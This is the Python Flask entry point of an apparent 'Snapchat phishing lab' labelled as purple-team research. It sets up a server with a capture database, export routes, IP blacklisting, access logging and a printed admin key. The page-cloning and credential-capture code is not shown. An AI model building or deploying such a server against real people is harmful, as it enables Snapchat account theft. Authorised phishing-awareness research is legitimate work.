import os
import sys
import secrets
from datetime import datetime

from flask import Flask, request, jsonify

from .config import CONFIG, BASE_DIR, ADMIN_KEY_FILE
from .database import init_database, log_access, is_blacklisted
from .routes import blueprints

sys.stdout.reconfigure(encoding='utf-8')

app = Flask(__name__,
            template_folder=os.path.join(BASE_DIR, "templates"),
            static_folder=os.path.join(BASE_DIR, "static"))
app.secret_key = secrets.token_hex(32)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = CONFIG["USE_HTTPS"]
app.config['TEMPLATES_AUTO_RELOAD'] = True

if CONFIG["USE_HTTPS"]:
    try:
        import cryptography
    except ImportError:
        print("[!] cryptography non installe. HTTPS desactive.")
        print("    pip install cryptography")
        CONFIG["USE_HTTPS"] = False

for bp in blueprints:
    app.register_blueprint(bp)


@app.before_request
def check_blacklist():
    if request.path == '/' or request.path.startswith('/static/'):
        return None
    if is_blacklisted(request.remote_addr):
        return jsonify({"error": "blocked", "message": "Your IP has been blacklisted"}), 403


@app.after_request
def log_api_access(response):
    if request.path.startswith('/api/') or request.path.startswith('/export/'):
        log_access(request.remote_addr, request.path, request.method, response.status_code)
    return response


def create_app():
    init_database()
    return app


if __name__ == '__main__':
    init_database()

    print(f"DB path: {CONFIG['CAPTURE_DB']}")
    print(f"DB exists: {os.path.exists(CONFIG['CAPTURE_DB'])}")

    print("")
    print("=" * 60)
    print(f"  ADMIN KEY: {CONFIG['ADMIN_KEY']}")
    print(f"  (saved in {ADMIN_KEY_FILE})")
    print("=" * 60)

    try:
        print("""
\x1b[95m\x1b[1m
  ╔══════════════════════════════════════════════════════════════════╗
  ║   SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique       ║
  ╠══════════════════════════════════════════════════════════════════╣
  ║   Objet    Etude de reaction au phishing (consentement req.)    ║
  ║   Cadre    Recherche ethique - Donnees anonymisees              ║
  ║   Interdit Toute utilisation non autorisee                      ║
  ╠══════════════════════════════════════════════════════════════════╣
  ║   Server running                http://0.0.0.0:""" + str(CONFIG["SERVER_PORT"]) + r"""              ║
  ║   Admin Key                """ + CONFIG["ADMIN_KEY"][:42] + r"""              ║
  ╚══════════════════════════════════════════════════════════════════╝
\x1b[0m
        """)
    except UnicodeEncodeError:
        print("SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique")
        proto = "https" if CONFIG["USE_HTTPS"] else "http"
        print(f"Server: {proto}://localhost:{CONFIG['SERVER_PORT']}")
        print(f"Admin Key: {CONFIG['ADMIN_KEY']}")

    app.run(host='0.0.0.0', port=CONFIG["SERVER_PORT"],
            ssl_context='adhoc' if CONFIG["USE_HTTPS"] else None,
            threaded=True)
